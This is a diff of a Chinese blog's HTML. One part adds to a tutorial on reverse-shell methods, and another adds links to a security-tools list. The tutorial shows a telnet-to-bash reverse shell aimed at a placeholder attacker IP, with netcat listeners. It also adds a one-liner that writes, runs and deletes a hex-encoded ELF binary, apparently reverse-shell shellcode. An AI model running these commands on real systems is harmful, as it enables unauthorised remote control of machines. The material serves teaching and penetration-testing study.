@@ -411,7 +411,11 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T</div><div class="line">nc -n -vv -l -p &lt;1st_port&gt; 	# A1</div><div class="line">nc -n -vv -l -p &lt;2nd_port&gt;	# A2</div></pre></td></tr></table></figure>
 <p><img src="/2018/01/30/reverse-shell的几种方式/5.png" alt=""></p>
 <ul>
-<li>这第五个其实挺有意思的。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-还有什么其它的方法？"><a href="#6-还有什么其它的方法？" class="headerlink" title="6.还有什么其它的方法？"></a>6.还有什么其它的方法？</h2><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
+<li>这第五个其实挺有意思的。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-机器码"><a href="#6-机器码" class="headerlink" title="6.机器码"></a>6.机器码</h2></li>
+<li>这里的shellcode可以使用msf生成<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -v -l 1337             # Attacker</div><div class="line">echo -e &quot;\x7F\x45\x4C\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x60\x80\x04\x08\x34\x00\x00\x00\xBC\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x28\x00\x03\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xAA\x00\x00\x00\xAA\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6A\x66\x58\x6A\x01\x5B\x31\xD2\x52\x53\x6A\x02\x89\xE1\xCD\x80\x92\xB0\x66\x68\x7F\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xE1\x6A\x10\x51\x52\x89\xE1\x43\xCD\x80\x6A\x02\x59\x87\xDA\xB0\x3F\xCD\x80\x49\x79\xF9\xB0\x0B\x41\x89\xCA\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80\x00\x2E\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2E\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0B\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x60\x80\x04\x08\x60\x00\x00\x00\x4A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xAA\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&quot; &gt; c; chmod +x c;./c &amp; rm c  # Target</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><ul>
 <li>这里只是一些小技巧，我希望在我们遇到比如某些命令在某个系统中不能使用的时候，或许我们可以发现并使用其它的方式，可以达到同样的效果，而不是在一棵树上吊死<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4></li>
 <li><a href="https://0x00sec.org/t/spawning-reverse-shells/2133" target="_blank" rel="external">Spawning reverse shells</a></li>
 </ul>
@@ -548,6 +552,8 @@
 <li>CloudFlair - 使用来自 Censys 的互联网扫描数据查找使用 CloudFlare 的网站的原始服务器的工具<br><a href="https://github.com/christophetd/CloudFlair" target="_blank" rel="external">https://github.com/christophetd/CloudFlair</a></li>
 <li>lanGhost - 可通过 Telegram 控制的局域网后门<br><a href="https://github.com/xdavidhu/lanGhost" target="_blank" rel="external">https://github.com/xdavidhu/lanGhost</a></li>
 <li>恐怖的 IoT 收割机 - Botnets 服务中的漏洞<br><a href="https://embedi.com/blog/grim-iot-reaper-1-and-0-day-vulnerabilities-at-the-service-of-botnets/" target="_blank" rel="external">https://embedi.com/blog/grim-iot-reaper-1-and-0-day-vulnerabilities-at-the-service-of-botnets/</a></li>
+<li>prospector - 类似 Pylint 的 Python 代码分析工具<br><a href="https://github.com/landscapeio/prospector" target="_blank" rel="external">https://github.com/landscapeio/prospector</a></li>
+<li>PHP源码调试之WINDOWS文件通配符分析<br><a href="http://avfisher.win/archives/888" target="_blank" rel="external">http://avfisher.win/archives/888</a></li>
 </ul>
 
           
